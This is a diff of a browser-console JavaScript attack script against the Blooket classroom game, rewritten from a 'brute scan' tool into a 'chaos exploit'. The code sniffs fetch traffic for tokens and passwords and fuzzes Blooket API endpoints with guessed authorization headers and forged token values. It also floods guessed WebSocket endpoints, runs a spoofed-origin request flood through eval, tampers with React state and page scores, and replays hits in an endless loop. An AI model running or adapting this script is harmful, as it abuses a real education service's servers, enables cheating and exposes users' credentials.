@@ -1,26 +1,26 @@
 (async () => {
-    if (document.getElementById('BRUTE_SCAN')) return console.log('Already scanning!');
+    if (document.getElementById('CHAOS_EXPLOIT')) return console.log('Chaos already unleashed!');
 
-    console.log('%c BRUTE SCAN V3.1 | BLOOKET EXPLOIT %c\n\tUnleashed Chaos - March 26, 2025 | Ben Stewart’s Moderator Test', 'color: #ff00ff; font-size: 2rem; font-weight: bold', '');
+    console.log('%c CHAOS EXPLOIT | BLOOKET ARMAGEDDON %c\n\tAlastair-Appazzola’s Ultimate Moderator Test - March 26, 2025', 'color: #ff00ff; font-size: 2.5rem; font-weight: bold; text-shadow: 0 0 10px #ff00ff', '');
 
     const style = document.createElement('style');
     style.innerHTML = `
-        #BRUTE_SCAN { position: fixed; top: 10px; left: 10px; width: 500px; height: 600px; background: #111; z-index: 99999; color: #0f0; padding: 15px; font-family: monospace; overflow-y: auto; border: 2px solid #ff00ff; box-shadow: 0 0 20px #ff00ff; }
-        .scanBtn { padding: 10px; margin: 5px 0; background: #333; cursor: pointer; transition: all 0.2s; }
-        .scanBtn:hover { background: #ff00ff; color: #000; transform: scale(1.05); }
-        #stopFuzzBtn, #stopExploitBtn { padding: 10px; margin: 5px 0; background: #f00; cursor: pointer; display: none; }
-        #stopFuzzBtn:hover, #stopExploitBtn:hover { background: #ff5555; }
-        #logArea { height: 450px; overflow-y: auto; margin-top: 10px; border-top: 1px solid #0f0; padding-top: 5px; }
-        #stats { color: #ff0; font-size: 0.9rem; margin-bottom: 10px; }
+        #CHAOS_EXPLOIT { position: fixed; top: 10px; left: 10px; width: 600px; height: 700px; background: #000; z-index: 99999; color: #0f0; padding: 20px; font-family: monospace; overflow-y: auto; border: 3px solid #ff00ff; box-shadow: 0 0 30px #ff00ff; }
+        .chaosBtn { padding: 12px; margin: 5px 0; background: #222; cursor: pointer; transition: all 0.3s; border: 1px solid #ff00ff; }
+        .chaosBtn:hover { background: #ff00ff; color: #000; transform: scale(1.1); box-shadow: 0 0 15px #ff00ff; }
+        #stopChaosBtn { padding: 12px; margin: 5px 0; background: #f00; cursor: pointer; display: none; border: 1px solid #fff; }
+        #stopChaosBtn:hover { background: #ff5555; }
+        #chaosLog { height: 500px; overflow-y: auto; margin-top: 15px; border-top: 2px solid #0f0; padding-top: 10px; }
+        #chaosStats { color: #ff0; font-size: 1rem; margin-bottom: 15px; text-shadow: 0 0 5px #ff0; }
     `;
     document.head.appendChild(style);
 
     const gui = document.createElement('div');
-    gui.id = 'BRUTE_SCAN';
+    gui.id = 'CHAOS_EXPLOIT';
     const stats = document.createElement('div');
-    stats.id = 'stats';
+    stats.id = 'chaosStats';
     const logArea = document.createElement('div');
-    logArea.id = 'logArea';
+    logArea.id = 'chaosLog';
     gui.append(stats, logArea);
     document.body.appendChild(gui);
 
@@ -34,17 +34,17 @@
         logArea.scrollTop = logArea.scrollHeight;
     };
 
-    console.log('The API Fuzzer 2.1 By Alastair-Appazzola on github!');
+    console.log('CHAOS UNLEASHED—Crypto Hack annihilation begins, Alastair-Appazzola!');
     const origFetch = window.fetch;
     window.fetch = async (url, opts) => {
         if (url.includes('blooket.com')) {
-            console.log('Sniffed Fetch:', { url, headers: opts.headers, body: opts.body });
+            console.log('Sniffed Fetch:', { url, method: opts.method || 'GET', headers: opts.headers || {}, body: opts.body || 'N/A' });
             if (opts.body) {
                 try {
                     const parsed = JSON.parse(opts.body);
-                    if (parsed.token || parsed.amount || parsed.crypto) {
+                    if (parsed.token || parsed.amount || parsed.crypto || parsed.password) {
                         console.log('Potential Crypto Hack payload:', parsed);
-                        potentials.push({ url, method: opts.method || 'POST', body: parsed });
+                        potentials.push({ url, method: opts.method || 'POST', headers: opts.headers || {}, body: parsed });
                     }
                 } catch {}
             }
@@ -68,9 +68,9 @@
     };
 
     const fuzzEndpoints = async (base) => {
-        const prefixes = ['/api', '/v1', '/v2', '/game', '/play', '/user', '/stats', '/live'];
-        const actions = ['tokens', 'users', 'games', 'state', 'update', 'session', 'player', 'auth', 'cheat', 'crypto'];
-        const params = ['?id=', '?token=', '?amount=', '?key=', '?crypto='];
+        const prefixes = ['/api', '/v1', '/v2', '/game', '/play', '/user', '/stats', '/live', '/crypto', '/hack'];
+        const actions = ['tokens', 'users', 'games', 'state', 'update', 'session', 'player', 'auth', 'cheat', 'crypto', 'password', 'score', 'points'];
+        const params = ['?id=', '?token=', '?amount=', '?key=', '?crypto=', '?password=', '?gameId=', '?rand='];
         const endpoints = [];
         for (const prefix of prefixes) {
             for (const action of actions) {
@@ -81,45 +81,56 @@
         return endpoints;
     };
 
-    let abortFuzz = false, abortExploit = false;
+    let abortChaos = false;
 
     const tests = [
         {
-            name: 'Vuln Scan in APIs',
+            name: 'API Apocalypse',
             run: () => {
                 const btn = document.createElement('div');
-                btn.className = 'scanBtn';
-                btn.innerText = 'Vuln Scan in APIs';
+                btn.className = 'chaosBtn';
+                btn.innerText = 'API Apocalypse';
                 const stopBtn = document.createElement('div');
-                stopBtn.id = 'stopFuzzBtn';
-                stopBtn.innerText = 'STOP SCANNING';
-                stopBtn.onclick = () => { abortFuzz = true; stopBtn.style.display = 'none'; console.log('API scan aborted!'); };
+                stopBtn.id = 'stopChaosBtn';
+                stopBtn.innerText = 'STOP CHAOS';
+                stopBtn.onclick = () => { abortChaos = true; stopBtn.style.display = 'none'; console.log('Chaos aborted, Alastair-Appazzola!'); };
                 btn.onclick = async () => {
-                    abortFuzz = false;
+                    abortChaos = false;
                     stopBtn.style.display = 'block';
-                    const tokenGuess = localStorage.token || `${Math.random().toString(36).slice(2)}`;
                     const bases = ['https://api.blooket.com', 'https://play.blooket.com', 'https://dashboard.blooket.com'];
+                    const methods = ['POST', 'GET', 'PUT', 'PATCH'];
+                    const tokenGuesses = [localStorage.token || 'guest', `Bearer ${Math.random().toString(36).slice(2)}`, btoa(JSON.stringify({ id: 'chaos', ts: Date.now() }))];
                     for (const base of bases) {
                         const endpoints = await fuzzEndpoints(base);
-                        console.log(`Scanning ${base} with ${endpoints.length} API checks...`);
+                        console.log(`Unleashing API apocalypse on ${base} - ${endpoints.length} endpoints...`);
                         for (const url of endpoints) {
-                            if (abortFuzz) break;
-                            console.log('Checking:', url);
+                            if (abortChaos) break;
+                            const method = methods[Math.floor(Math.random() * methods.length)];
+                            const token = tokenGuesses[Math.floor(Math.random() * tokenGuesses.length)];
+                            console.log('Fuzzing:', url);
                             try {
                                 const res = await fetch(url, {
-                                    method: Math.random() > 0.5 ? 'POST' : 'GET',
+                                    method,
                                     headers: { 
-                                        'Authorization': tokenGuess,
+                                        'Authorization': token,
                                         'Content-Type': 'application/json',
-                                        'X-Fuzz': 'BRUTE_SCAN_V3.1'
+                                        'X-Chaos': 'ALASTAIR-APPAZZOLA',
+                                        'User-Agent': `ChaosBot/${Math.random()}`,
                                     },
-                                    body: JSON.stringify({ amount: 9999, tokens: 9999, crypto: 9999, cheat: true })
+                                    body: method !== 'GET' ? JSON.stringify({ 
+                                        amount: 9999999, 
+                                        tokens: 9999999, 
+                                        crypto: 9999999, 
+                                        password: Math.random().toString(36).slice(2), 
+                                        cheat: true, 
+                                        chaos: Math.random() 
+                                    }) : undefined
                                 });
                                 if (res.ok) {
                                     hits++;
                                     const data = await res.json();
-                                    console.log(`Found vuln at ${url}:`, data);
-                                    if (data.token || data.amount || data.crypto) potentials.push({ url, method: 'POST', body: { amount: 9999, tokens: 9999, crypto: 9999 } });
+                                    console.log(`API VULN HIT at ${url}:`, data);
+                                    potentials.push({ url, method, headers: { 'Authorization': token }, body: { amount: 9999999, tokens: 9999999, crypto: 9999999 } });
                                 } else {
                                     misses++;
                                     console.log(`No vuln at ${url}:`, res.status);
@@ -128,9 +139,9 @@
                                 misses++;
                                 console.log(`Missed ${url}:`, e.message);
                             }
-                            await new Promise(r => setTimeout(r, 100));
+                            await new Promise(r => setTimeout(r, 50));
                         }
-                        if (abortFuzz) break;
+                        if (abortChaos) break;
                     }
                     stopBtn.style.display = 'none';
                     updateStats();
@@ -139,45 +150,45 @@
             }
         },
         {
-            name: 'Blast Game Connections',
+            name: 'WebSocket Annihilation',
             run: () => {
                 const btn = document.createElement('div');
-                btn.className = 'scanBtn';
-                btn.innerText = 'Blast Game Connections';
+                btn.className = 'chaosBtn';
+                btn.innerText = 'WebSocket Annihilation';
                 btn.onclick = async () => {
                     const wsBases = ['wss://play.blooket.com', 'wss://api.blooket.com', 'wss://dashboard.blooket.com'];
-                    const wsPaths = ['/ws', '/socket', '/game', '/live', '/play', '/cheat', '/crypto'];
-                    const tokenGuesses = [
-                        localStorage.token || 'guest',
-                        'Bearer ' + Math.random().toString(36).slice(2),
-                        btoa(JSON.stringify({ id: 'brute', ts: Date.now() }))
-                    ];
+                    const wsPaths = ['/ws', '/socket', '/game', '/live', '/play', '/cheat', '/crypto', '/hack', ''];
+                    const tokenGuesses = [localStorage.token || 'guest', `Bearer ${Math.random().toString(36).slice(2)}`, btoa(JSON.stringify({ id: 'chaos', ts: Date.now() }))];
                     const liveUrls = liveWSUrls.size ? Array.from(liveWSUrls) : [];
-                    console.log('Live Crypto Hack WS sniffed:', liveUrls);
+                    console.log('Sniffed WS targets:', liveUrls);
                     const targets = liveUrls.length ? liveUrls : wsBases.flatMap(base => wsPaths.map(path => `${base}${path}`));
-                    console.log(`Blasting ${targets.length} connections with ${tokenGuesses.length} keys...`);
+                    console.log(`Annihilating ${targets.length} WS connections with ${tokenGuesses.length} keys...`);
                     targets.forEach(url => {
                         tokenGuesses.forEach(token => {
-                            const fullUrl = `${url}?token=${encodeURIComponent(token)}&rand=${Math.random()}`;
-                            console.log('Blasting:', fullUrl);
-                            let retries = 5;
+                            const fullUrl = `${url}?token=${encodeURIComponent(token)}&chaos=${Math.random()}`;
+                            console.log('Blasting WS:', fullUrl);
+                            let retries = 10;
                             const connect = () => {
                                 const ws = new WebSocket(fullUrl);
                                 ws.onopen = () => {
                                     wsConnections++;
-                                    console.log('Connected:', fullUrl, '—spamming Crypto Hack...');
+                                    console.log('WS Connected:', fullUrl, '—unleashing hell...');
                                     const flood = setInterval(() => {
                                         if (ws.readyState === 1) ws.send(JSON.stringify({ 
-                                            type: ['cheat', 'auth', 'update', 'crypto'][Math.floor(Math.random() * 4)], 
-                                            tokens: 9999, crypto: 9999, chaos: Math.random() 
+                                            type: ['cheat', 'auth', 'update', 'crypto', 'hack'][Math.floor(Math.random() * 5)], 
+                                            tokens: 9999999, 
+                                            crypto: 9999999, 
+                                            password: Math.random().toString(36).slice(2), 
+                                            chaos: Math.random() 
                                         }));
                                         else clearInterval(flood);
-                                    }, 100);
+                                    }, 50);
                                 };
-                                ws.onerror = () => {
-                                    if (retries--) setTimeout(connect, 1000);
+                                ws.onerror = () => { if (retries--) setTimeout(connect, 500); };
+                                ws.onmessage = (msg) => {
+                                    console.log('WS Response:', fullUrl, msg.data);
+                                    if (msg.data.includes('token') || msg.data.includes('crypto')) potentials.push({ url: fullUrl, type: 'WS', body: JSON.parse(msg.data) });
                                 };
-                                ws.onmessage = (msg) => console.log('Crypto Hack WS response:', fullUrl, msg.data);
                             };
                             connect();
                         });
@@ -187,47 +198,56 @@
             }
         },
         {
-            name: 'Stealth Proxy Chaos',
+            name: 'Stealth Proxy Domination',
             run: () => {
                 const btn = document.createElement('div');
-                btn.className = 'scanBtn';
-                btn.innerText = 'Stealth Proxy';
+                btn.className = 'chaosBtn';
+                btn.innerText = 'Stealth Proxy Domination';
                 btn.onclick = () => {
                     const tokenGuess = localStorage.token || 'guest';
-                    const proxyCode = `
-                        const urls = Array(50).fill().map((_, i) => 
-                            'https://' + ['api', 'play', 'dashboard'][i % 3] + '.blooket.com/api/' + 
-                            ['tokens', 'games', 'stats', 'update', 'crypto'][i % 5] + '?rand=' + Math.random()
+                    const chaosCode = `
+                        const urls = Array(100).fill().map((_, i) => 
+                            'https://' + ['api', 'play', 'dashboard'][i % 3] + '.blooket.com/' + 
+                            ['api', 'v1', 'game', 'crypto'][i % 4] + '/' + 
+                            ['tokens', 'games', 'stats', 'update', 'crypto', 'hack'][i % 6] + 
+                            '?chaos=' + Math.random()
                         );
                         let hits = 0;
                         urls.forEach(url => {
                             fetch(url, {
-                                method: 'POST',
+                                method: ['POST', 'PUT', 'PATCH'][Math.floor(Math.random() * 3)],
                                 headers: { 
                                     'Authorization': '${tokenGuess}',
                                     'Content-Type': 'application/json',
-                                    'X-Stealth': 'BRUTE_SCAN_V3.1'
+                                    'X-Chaos': 'ALASTAIR-APPAZZOLA',
+                                    'Origin': 'https://play.blooket.com'
                                 },
-                                body: JSON.stringify({ amount: 9999, tokens: 9999, crypto: 9999, chaos: true })
+                                body: JSON.stringify({ 
+                                    amount: 9999999, 
+                                    tokens: 9999999, 
+                                    crypto: 9999999, 
+                                    password: Math.random().toString(36).slice(2), 
+                                    chaos: true 
+                                })
                             })
                             .then(res => res.ok ? res.json() : Promise.reject(res.status))
                             .then(data => { console.log('Stealth Hit:', url, data); hits++; })
                             .catch(e => console.log('Stealth Miss:', url, e));
                         });
-                        setTimeout(() => console.log('Stealth Proxy Done - Hits:', hits), 5000);
+                        setTimeout(() => console.log('Stealth Domination Done - Hits:', hits), 10000);
                     `;
-                    eval(proxyCode); // CSP allows 'unsafe-eval'—bypass Blob block
-                    console.log('Stealth proxy unleashed via eval!');
+                    eval(chaosCode);
+                    console.log('Stealth proxy domination unleashed via eval, Alastair-Appazzola!');
                 };
                 gui.appendChild(btn);
             }
         },
         {
-            name: 'Obliterate State/DOM',
+            name: 'State & DOM Obliteration',
             run: () => {
                 const btn = document.createElement('div');
-                btn.className = 'scanBtn';
-                btn.innerText = 'Obliterate State';
+                btn.className = 'chaosBtn';
+                btn.innerText = 'State & DOM Obliteration';
                 btn.onclick = () => {
                     const reactRoot = window._reactRootContainer || window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.get(1)?.getFiberRoot();
                     if (reactRoot) {
@@ -235,8 +255,9 @@
                         const mutate = (node) => {
                             if (node.memoizedState) {
                                 for (let key in node.memoizedState) {
-                                    if (typeof node.memoizedState[key] === 'number' && (key.includes('token') || key.includes('crypto') || key.includes('point'))) {
-                                        node.memoizedState[key] = 9999999 + Math.floor(Math.random() * 1000);
+                                    if (typeof node.memoizedState[key] === 'number' && 
+                                        (key.includes('token') || key.includes('crypto') || key.includes('point') || key.includes('score') || key.includes('amount'))) {
+                                        node.memoizedState[key] = 9999999 + Math.floor(Math.random() * 10000);
                                         console.log(`Mutated ${key} to`, node.memoizedState[key]);
                                     }
                                 }
@@ -245,58 +266,86 @@
                             if (node.sibling) mutate(node.sibling);
                         };
                         mutate(stateNode);
-                        console.log('Crypto Hack state obliterated—check the chaos!');
+                        console.log('State annihilated—Crypto Hack in ruins!');
                     }
-                    const domTargets = document.querySelectorAll('[class*="token"], [class*="crypto"], [class*="point"], [class*="score"]');
+                    const domTargets = document.querySelectorAll('[class*="token"], [class*="crypto"], [class*="point"], [class*="score"], [id*="token"], [id*="crypto"]');
                     domTargets.forEach((el, i) => {
                         el.textContent = `999999${i}`;
                         el.style.color = '#ff00ff';
+                        el.style.fontSize = '2rem';
+                        el.style.textShadow = '0 0 10px #ff00ff';
                         console.log('DOM Nuked:', el);
                     });
+                    for (let i = 0; i < 20; i++) {
+                        const fake = document.createElement('div');
+                        fake.className = `chaos_${Math.random().toString(36).slice(2)}`;
+                        fake.textContent = `CHAOS_999999${i}`;
+                        fake.style.position = 'absolute';
+                        fake.style.top = `${Math.random() * 100}%`;
+                        fake.style.left = `${Math.random() * 100}%`;
+                        fake.style.color = '#0f0';
+                        fake.style.fontSize = '1.5rem';
+                        document.body.appendChild(fake);
+                    }
+                    console.log('DOM flooded with chaos, Alastair-Appazzola!');
                 };
                 gui.appendChild(btn);
             }
         },
         {
-            name: 'Exploit Potentials',
+            name: 'Exploit Everything',
             run: () => {
                 const btn = document.createElement('div');
-                btn.className = 'scanBtn';
-                btn.innerText = 'Exploit Potentials';
-                const stopBtn = document.createElement('div');
-                stopBtn.id = 'stopExploitBtn';
-                stopBtn.innerText = 'STOP EXPLOITING';
-                stopBtn.onclick = () => { abortExploit = true; stopBtn.style.display = 'none'; console.log('Exploit aborted!'); };
+                btn.className = 'chaosBtn';
+                btn.innerText = 'Exploit Everything';
                 btn.onclick = async () => {
-                    if (!potentials.length) return console.log('No potentials yet—scan first!');
-                    abortExploit = false;
-                    stopBtn.style.display = 'block';
-                    for (const { url, method, body } of potentials) {
-                        if (abortExploit) break;
-                        console.log(`Exploiting Crypto Hack at ${url}`);
-                        try {
-                            const res = await fetch(url, {
-                                method: method || 'POST',
-                                headers: { 'Authorization': localStorage.token || 'guest', 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ ...body, amount: 999999, tokens: 999999, crypto: 999999 })
-                            });
-                            if (res.ok) {
-                                hits++;
-                                console.log(`Exploit SUCCESS at ${url}:`, await res.json());
+                    if (!potentials.length) return console.log('No potentials yet—unleash more chaos first!');
+                    console.log(`Exploiting ${potentials.length} potentials—total annihilation begins...`);
+                    let exploitsFound = 0;
+                    const loop = async () => {
+                        for (const { url, method, headers, body, type } of potentials) {
+                            if (abortChaos) break;
+                            console.log(`Exploiting ${type || 'API'} at ${url}`);
+                            if (type === 'WS') {
+                                const ws = new WebSocket(url);
+                                ws.onopen = () => {
+                                    ws.send(JSON.stringify({ ...body, amount: 9999999, tokens: 9999999, crypto: 9999999, chaos: true }));
+                                    console.log('WS Exploit sent:', url);
+                                };
                             } else {
-                                misses++;
-                                console.log(`Exploit failed at ${url}:`, res.status);
+                                try {
+                                    const res = await fetch(url, {
+                                        method: method || 'POST',
+                                        headers: { ...headers, 'X-Chaos': 'ALASTAIR-APPAZZOLA' },
+                                        body: JSON.stringify({ ...body, amount: 9999999, tokens: 9999999, crypto: 9999999, chaos: true })
+                                    });
+                                    if (res.ok) {
+                                        exploitsFound++;
+                                        hits++;
+                                        console.log(`Exploit SUCCESS at ${url}:`, await res.json());
+                                    } else {
+                                        misses++;
+                                        console.log(`Exploit failed at ${url}:`, res.status);
+                                    }
+                                } catch (e) {
+                                    misses++;
+                                    console.log(`Exploit error at ${url}:`, e.message);
+                                }
                             }
-                        } catch (e) {
-                            misses++;
-                            console.log(`Exploit error at ${url}:`, e.message);
+                            await new Promise(r => setTimeout(r, 100));
                         }
-                        await new Promise(r => setTimeout(r, 200));
-                    }
-                    stopBtn.style.display = 'none';
+                        if (!abortChaos && exploitsFound < potentials.length) {
+                            console.log('Looping exploits—more chaos to come!');
+                            await new Promise(r => setTimeout(r, 1000));
+                            loop();
+                        } else {
+                            console.log(`Chaos complete! Exploits found: ${exploitsFound}`);
+                        }
+                    };
+                    loop();
                     updateStats();
                 };
-                gui.append(btn, stopBtn);
+                gui.appendChild(btn);
             }
         }
     ];
@@ -306,5 +355,11 @@
         test.run();
     });
 
-    document.querySelectorAll('#BRUTE_SCAN:not(:last-child)').forEach(el => el.remove());
+    document.querySelectorAll('#CHAOS_EXPLOIT:not(:last-child)').forEach(el => el.remove());
+
+    setInterval(() => {
+        const suspicious = document.querySelectorAll('[data-amount], [data-tokens], [data-crypto], [data-password]');
+        if (suspicious.length) console.log('Suspicious elements detected:', suspicious);
+        updateStats();
+    }, 3000);
 })();
